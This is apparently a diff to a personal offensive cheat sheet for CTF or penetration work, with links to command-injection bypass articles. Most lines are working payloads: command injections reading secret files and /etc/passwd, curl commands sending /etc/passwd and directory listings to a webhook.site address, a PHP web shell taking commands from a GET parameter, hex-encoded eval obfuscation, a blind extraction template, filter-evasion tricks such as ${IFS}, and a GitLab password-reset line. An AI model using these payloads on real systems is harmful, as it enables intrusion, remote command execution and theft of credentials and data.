@@ -1,4 +1,7 @@
-concat/group_concat(0x3c,'?php ',' phpinfo(); ?',0x3e)
+https://viblo.asia/p/bypass-os-command-injection-XL6lA4rNZek#_4-bypass-characters-filter-via-hex-encoding-3
+https://viblo.asia/p/bypass-os-command-injection-XL6lA4rNZek
+https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions
+php -r eval\(substr\(hex2bin\(<payload>\),1\)\);
 google.com -d $(ls / -I "bin" -I "boot")
 google.com -d $(cat /3ef1cafd_secret.txt)
 
@@ -7,9 +10,8 @@ echo 'os.execute("cat /root/flag.txt")' > /tmp/a.lua
 curl -d @/output.txt https://webhook.site/54622bd8-cae3-4262-986d-441c42250814
 curl -d @/etc/passwd https://webhook.site/54622bd8-cae3-4262-986d-441c42250814
 curl --data $(ls /) https://webhook.site/54622bd8-cae3-4262-986d-441c42250814
+curl https://cdn.mysql.com//Downloads/MySQL-8.1/mysql-8.1.0-linux-glibc2.28-x86_64.tar.xz -o mysql.tar.xz    #curl to download
 
-https://viblo.asia/p/bypass-os-command-injection-XL6lA4rNZek
-https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions
 echo `ls /`           //`....` "   run code in "
 <?php die(`$_GET['cmd']`);?>; 
 echo $(ls /) >> /var/www/html/index.php
@@ -24,6 +26,8 @@ DETERMINE = "; if [ $(cat /*.txt | head -n1 | cut -c{offset}) = '{so_sanh}' ]; t
 case "$sheng" in "nguqua") echo dungvai;;"ok") echo sairoi;;
 for file in /{usr/}bin/*calc} ;do if [ -x "$file" ]; then echo $file; fi;done;
 
+https://viblo.asia/p/redteam-0x01-lam-gi-khi-da-chiem-duoc-quyen-dieu-khien-he-thong-phan-1-source-code-management-E1XVOa8GJMz
+printf "Password\nPassword\n" | gitlab-rake
 echo${IFS}1           //${IFS} bypass space
 %09 tab thay dau cach
 %0a newline \n
@@ -59,3 +63,4 @@ echo 'foo\
 bar'     # Escape character \ taken literally because of strong quoting.
 #foo\
 #bar
+eval substr(hex2bin('687a336332'), 1);
